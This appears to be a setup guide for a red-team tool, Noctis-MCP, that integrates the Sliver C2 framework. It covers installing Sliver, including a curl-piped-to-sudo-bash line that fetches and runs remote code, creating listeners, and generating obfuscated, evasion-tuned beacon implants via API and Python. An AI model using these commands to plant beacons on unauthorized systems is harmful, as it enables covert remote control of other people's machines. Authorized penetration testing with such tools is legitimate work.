# Installing Sliver C2 for Noctis-MCP

Noctis-MCP integrates with real C2 frameworks. This guide covers Sliver installation.

## Quick Install

### Linux (Recommended)
```bash
# Install Sliver
curl https://sliver.sh/install | sudo bash

# Verify installation
sliver-client version
sliver-server version
```

### Manual Installation
```bash
# Download latest release
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -O /usr/local/bin/sliver-server
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -O /usr/local/bin/sliver-client

# Make executable
chmod +x /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-client
```

## Starting Sliver Server

### 1. Start the Server
```bash
# Start Sliver server daemon
sudo sliver-server daemon

# OR start interactive
sliver-server
```

### 2. Create Operator (in Sliver console)
```
sliver > new-operator --name noctis --lhost 127.0.0.1 --lport 31337
```

### 3. Create Listener
```
# HTTPS listener
sliver > https -L 192.168.1.100 -l 443

# DNS listener
sliver > dns -d example.com

# mTLS listener
sliver > mtls -L 192.168.1.100 -l 8888
```

## Using with Noctis-MCP

### Via API
```bash
curl -X POST http://localhost:8888/api/c2/sliver/generate \
  -H "Content-Type: application/json" \
  -d '{
    "listener_host": "192.168.1.100",
    "listener_port": 443,
    "protocol": "https",
    "architecture": "x64",
    "techniques": ["NOCTIS-T124", "NOCTIS-T118"],
    "obfuscate": true
  }'
```

### Via Python
```python
from c2_adapters.sliver_adapter import generate_sliver_beacon

result = generate_sliver_beacon(
    listener_host="192.168.1.100",
    listener_port=443,
    protocol="https",
    architecture="x64",
    techniques=["NOCTIS-T124"],  # API hashing
    obfuscate=True,
    verbose=True
)

if result.success:
    print(f"Beacon generated: {result.beacon_path}")
    print(f"OPSEC Score: {result.opsec_score}/10")
```

## Troubleshooting

### Sliver Not Found
```bash
# Check installation
which sliver-client
which sliver-server

# Add to PATH if needed
export PATH=$PATH:/usr/local/bin
```

### Connection Issues
```bash
# Check Sliver server is running
ps aux | grep sliver-server

# Check logs
sudo journalctl -u sliver-server -f
```

### Permission Issues
```bash
# Run with sudo if needed
sudo sliver-server
```

## References
- Official Docs: https://github.com/BishopFox/sliver/wiki
- Installation: https://github.com/BishopFox/sliver#install
- Noctis Docs: See CURRENT_STATUS.md

---
**WARNING:** Use only in authorized environments. Generating C2 beacons without authorization is illegal.
